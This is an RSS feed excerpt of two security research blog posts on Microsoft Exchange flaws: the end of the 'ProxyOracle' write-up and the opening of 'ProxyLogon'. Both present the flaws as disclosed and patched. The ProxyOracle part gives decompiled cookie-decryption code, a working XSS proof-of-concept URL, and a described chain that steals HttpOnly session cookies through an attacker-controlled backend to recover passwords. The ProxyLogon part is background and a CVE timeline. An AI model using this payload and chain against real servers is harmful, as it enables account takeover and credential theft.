                &lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoTransform2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;TransformFinalBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CryptographicException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CryptographicException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[FbaModule::ParseCadataCookies] Received CryptographicException {0} transforming auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AppendToLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;CryptoError=PossibleSSLCertrolloverMismatch&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FormatException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;IsTraceEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;ExTraceGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerboseTracer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TraceDebug&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FormatException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetHashCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[FbaModule::ParseCadataCookies] Received FormatException {0} decoding caData auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ex9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;httpApplication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AppendToLog&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;DecodeError=InvalidCaDataAuthCookie&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Unicode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bytes2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Headers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Authorization&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;@string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It should be noted that since the IV is encrypted with the SSL certificate private key, we can‚Äôt recover the first block of the ciphertext through XOR. But it wouldn‚Äôt cause any problem for us because the C# internally processes the strings as UTF-16, so the first 12 bytes of the ciphertext must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;B\x00a\x00s\x00i\x00c\x00 \x00&lt;/code&gt;. With one more Base64 encoding applied, we will only lose the first 1.5 bytes in the username field.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;(16‚àí6√ó2) √∑ 2 √ó (3/4) = 1.5&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;the-exploit&quot;&gt;The Exploit&lt;/h1&gt;

&lt;p&gt;As of now, we have a Padding Oracle that allows us to decrypt any user‚Äôs cookie. BUT, how can we get the client cookies? Here we find another vulnerability to chain them together.&lt;/p&gt;

&lt;h2 id=&quot;xss-to-steal-client-cookies&quot;&gt;XSS to Steal Client Cookies&lt;/h2&gt;

&lt;p&gt;We discover an XSS (CVE-2021-31195) in the CAS Frontend (Yeah, CAS again) to chain together, the root cause of this XSS is relatively easy: Exchange forgets to sanitize the data before printing it out so that we can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; to escape from the JSON format and inject arbitrary JavaScript code.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://exchange/owa/auth/frowny.aspx
?app=people
&amp;amp;et=ServerError
&amp;amp;esrc=MasterPage
&amp;amp;te=\
&amp;amp;refurl=}}};alert(document.domain)//
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But here comes another question: all the sensitive cookies are protected by the HttpOnly flag, which makes us unable to access the cookies by JavaScript. WHAT SHOULD WE DO?&lt;/p&gt;

&lt;h2 id=&quot;bypass-the-httponly&quot;&gt;Bypass the HttpOnly&lt;/h2&gt;

&lt;p&gt;As we could execute arbitrary JavaScript on browsers, why don‚Äôt we just insert the SSRF cookie we used in ProxyLogon? Once we add this cookie and assign the Backend target value as our malicious server, Exchange will become a proxy between the victims and us. We can then take over all the client‚Äôs HTTP static resources and get the protected HttpOnly cookies!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/2/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By chaining bugs together, we have an elegant exploit that can steal any user‚Äôs cookies by just sending him/her a malicious link. What‚Äôs noteworthy is that the XSS here is only helping us to steal the cookie, which means all the decryption processes wouldn‚Äôt require any authentication and user interaction. Even if the user closes the browser, it wouldn‚Äôt affect our Padding Oracle Attack!&lt;/p&gt;

&lt;p&gt;Here is the &lt;a href=&quot;https://www.youtube.com/watch?v=VuJvmJZxogc&quot;&gt;demonstration video&lt;/a&gt; showing how we recover the victim‚Äôs password:&lt;/p&gt;

&lt;div style=&quot;text-align: center;&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/VuJvmJZxogc&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;

&lt;!-- # The Timeline

* --&gt;
</description>
                <link>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/</link>
                <guid>https://devco.re/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle</guid>
                <pubDate>Fri, 06 Aug 2021 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>A New Attack Surface on MS Exchange Part 1 - ProxyLogon!</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: 0.6em;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
    .center-image {
        margin: 0 auto;
        display: block;
    }
&lt;/style&gt;

&lt;p&gt;The series of A New Attack Surface on MS Exchange:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-1-ProxyLogon/&quot;&gt;A New Attack Surface on MS Exchange Part 1 - ProxyLogon!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/06/a-new-attack-surface-on-MS-exchange-part-2-ProxyOracle/&quot;&gt;A New Attack Surface on MS Exchange Part 2 - ProxyOracle!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2021/08/22/a-new-attack-surface-on-MS-exchange-part-3-ProxyShell/&quot;&gt;A New Attack Surface on MS Exchange Part 3 - ProxyShell!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;/blog/2022/10/19/a-new-attack-surface-on-MS-exchange-part-4-ProxyRelay/&quot;&gt;A New Attack Surface on MS Exchange Part 4 - ProxyRelay!&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Microsoft Exchange, as one of the most common email solutions in the world, has become part of the daily operation and security connection for governments and enterprises. This January, we reported a series of vulnerabilities of Exchange Server to Microsoft and named it as &lt;a href=&quot;https://proxylogon.com/&quot;&gt;ProxyLogon&lt;/a&gt;. ProxyLogon might be the most severe and impactful vulnerability in the Exchange history ever. If you were paying attention to the industry news, you must have heard it.&lt;/p&gt;

&lt;p&gt;While looking into ProxyLogon from the architectural level, we found it is not just a vulnerability, but an attack surface that is totally new and no one has ever mentioned before. This attack surface could lead the hackers or security researchers to more vulnerabilities. Therefore, we decided to focus on this attack surface and eventually found at least 8 vulnerabilities. These vulnerabilities cover from server side, client side, and even crypto bugs. We chained these vulnerabilities into 3 attacks:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;ProxyLogon: The most well-known and impactful Exchange exploit chain&lt;/li&gt;
  &lt;li&gt;ProxyOracle: The attack which could recover any password in plaintext format of Exchange users&lt;/li&gt;
  &lt;li&gt;ProxyShell: The exploit chain we demonstrated at &lt;a href=&quot;https://twitter.com/thezdi/status/1379467992862449664&quot;&gt;Pwn2Own 2021&lt;/a&gt; to take over Exchange and earn $200,000 bounty&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I would like to highlight that all vulnerabilities we unveiled here are logic bugs, which means they could be reproduced and exploited more easily than any memory corruption bugs. We have presented our research at &lt;a href=&quot;https://www.blackhat.com/us-21/briefings/schedule/index.html#proxylogon-is-just-the-tip-of-the-iceberg-a-new-attack-surface-on-microsoft-exchange-server-23442&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-29/dc-29-speakers.html&quot;&gt;DEFCON&lt;/a&gt;, and won the Best Server-Side bug of &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;Pwnie Awards 2021&lt;/a&gt;. You can check our presentation materials here:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! &lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf&quot;&gt;[Slides]&lt;/a&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=5mqid-7zp8k&quot;&gt;[Video]&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By understanding the basics of this new attack surface, you won‚Äôt be surprised why we can pop out 0days easily!&lt;/p&gt;

&lt;h1 id=&quot;intro&quot;&gt;Intro&lt;/h1&gt;

&lt;p&gt;I would like to state that all the vulnerabilities mentioned have been reported via the responsible vulnerability disclosure process and patched by Microsoft. You could find more detail of the CVEs and the report timeline from the following table.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Report Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Name&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CVE&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Patch Time&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;CAS&lt;sup&gt;[1]&lt;/sup&gt;&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Reported By&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 05, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyLogon&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Mar 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai, Volexity and MSTIC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196&quot;&gt;CVE-2021-31196&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jan 17, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyOracle&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195&quot;&gt;CVE-2021-31195&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473&quot;&gt;CVE-2021-34473&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523&quot;&gt;CVE-2021-34523&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Apr 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ProxyShell&lt;sup&gt;[2]&lt;/sup&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207&quot;&gt;CVE-2021-31207&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;May 11, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai working with ZDI&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Yes&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jun 02, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768&quot;&gt;CVE-2021-33768&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Jul 13, 2021&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;-&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Orange Tsai and Dlive&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div style=&quot;font-size:0.6em; line-height: 1.6;&quot;&gt;
&lt;br /&gt;&lt;em&gt;[1] Bugs relate to this new attack surface direclty&lt;/em&gt;&lt;br /&gt;
&lt;em&gt;[2] Pwn2Own 2021 bugs&lt;/em&gt;
&lt;/div&gt;

&lt;p&gt;Why did Exchange Server become a hot topic? From my point of view, the whole ProxyLogon attack surface is actually located at an early stage of Exchange request processing. For instance, if the entrance of Exchange is 0, and 100 is the core business logic, ProxyLogon is somewhere around 10. Again, since the vulnerability is located at the beginning place, I believe anyone who has reviewed the security of Exchange carefully would spot the attack surface. This was also &lt;a href=&quot;https://twitter.com/orange_8361/status/1346401788811825153&quot;&gt;why I tweeted my worry&lt;/a&gt; about bug collision after reporting to Microsoft. The vulnerability was so impactful, yet it‚Äôs a simple one and located at such an early stage.&lt;/p&gt;

&lt;p&gt;You all know what happened next, Volexity found that an APT group was leveraging the same SSRF (&lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855&quot;&gt;CVE-2021-26855&lt;/a&gt;) to access users‚Äô emails in early January 2021 and reported to Microsoft. Microsoft also released the urgent patches in March. From the &lt;a href=&quot;https://youtu.be/rB255D-wnw0?t=999&quot;&gt;public information&lt;/a&gt; released afterwards, we found that even though they used the same SSRF, the APT group was exploiting it in a very different way from us. We completed the ProxyLogon attack chain through &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065&quot;&gt;CVE-2021-27065&lt;/a&gt;, while the APT group used EWS and two unknown vulnerabilities in their attack. This has convinced us that there is a bug collision on the SSRF vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/1.png&quot; alt=&quot;&quot; /&gt;
&lt;em&gt;&lt;small&gt;Image from &lt;a href=&quot;https://www.microsoft.com/security/blog/2021/03/25/analyzing-attacks-taking-advantage-of-the-exchange-server-vulnerabilities/&quot;&gt;Microsoft Blog&lt;/a&gt;&lt;/small&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Regarding the ProxyLogon PoC we reported to MSRC appeared in the wild in late February, we were as curious as everyone after eliminating the possibility of leakage from our side through a thorough investigation. With a clearer timeline appearing and more discussion occurring, it seems like this is &lt;a href=&quot;https://msrc-blog.microsoft.com/2012/03/16/proof-of-concept-code-available-for-ms12-020/&quot;&gt;not the first time that something like this happened to Microsoft&lt;/a&gt;. Maybe you would be interested in learning some &lt;a href=&quot;https://www.wsj.com/articles/microsoft-probing-whether-leak-played-role-in-suspected-chinese-hack-11615575793&quot;&gt;interesting stories from here&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;why-targeting-on-exchange-server&quot;&gt;Why targeting on Exchange Server?&lt;/h1&gt;

&lt;p&gt;Mail server is a highly valuable asset that holds the most confidential secrets and corporate data. In other words, controlling a mail server means controlling the lifeline of a company. As the most common-use email solution, Exchange Server has been the top target for hackers for a long time. Based on our research, there are more than four hundred thousands Exchange Servers exposed on the Internet. Each server represents a company, and you can imagine how horrible it is while a severe vulnerability appeared in Exchange Server.&lt;/p&gt;

&lt;p&gt;Normally, I will review the existing papers and bugs before starting a research. Among the whole Exchange history, is there any interesting case? Of course. Although most vulnerabilities are based on known attack vectors, such as the deserialization or bad input validation, there are still several bugs that are worth mentioning.&lt;/p&gt;

&lt;h3 id=&quot;the-most-special&quot;&gt;The most special&lt;/h3&gt;
&lt;p&gt;The most special one is the &lt;a href=&quot;https://msrc-blog.microsoft.com/2017/07/20/englishmansdentist-exploit-analysis/&quot;&gt;arsenal&lt;/a&gt; from &lt;a href=&quot;https://en.wikipedia.org/wiki/Equation_Group&quot;&gt;Equation Group&lt;/a&gt; in 2017. It‚Äôs the only practical and public pre-auth RCE in the Exchange history. Unfortunately, the arsenal only works on an ancient Exchange Server 2003. If the arsenal leak happened earlier, it could end up with another nuclear-level crisis.&lt;/p&gt;

&lt;h3 id=&quot;the-most-interesting&quot;&gt;The most interesting&lt;/h3&gt;
&lt;p&gt;The most interesting one is &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange&quot;&gt;CVE-2018-8581&lt;/a&gt; disclosed by someone who cooperated with ZDI. Though it was simply an SSRF, with the feature, it could be combined with NTLM Relay, the attacker could turn a boring SSRF into &lt;a href=&quot;https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/&quot;&gt;something really fancy&lt;/a&gt;. For instance, it could directly control the whole Domain Controller through a low privilege account.&lt;/p&gt;

&lt;h3 id=&quot;the-most-surprising&quot;&gt;The most surprising&lt;/h3&gt;
&lt;p&gt;The most surprising one is &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688&lt;/a&gt;, which was also disclosed by someone working with ZDI. The root cause of this bug is due to a hard-coded cryptographic key in Microsoft Exchange. With this hard-coded key, an attacker with low privilege can take over the whole Exchange Server. And as you can see, even in 2020, a silly, hard-coded cryptographic key could still be found in an essential software like Exchange. This indicated that Exchange is lacking security reviews, which also inspired me to dig more into the Exchange security.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20210806/1/2.gif&quot; alt=&quot;&quot; class=&quot;center-image&quot; /&gt;&lt;/p&gt;

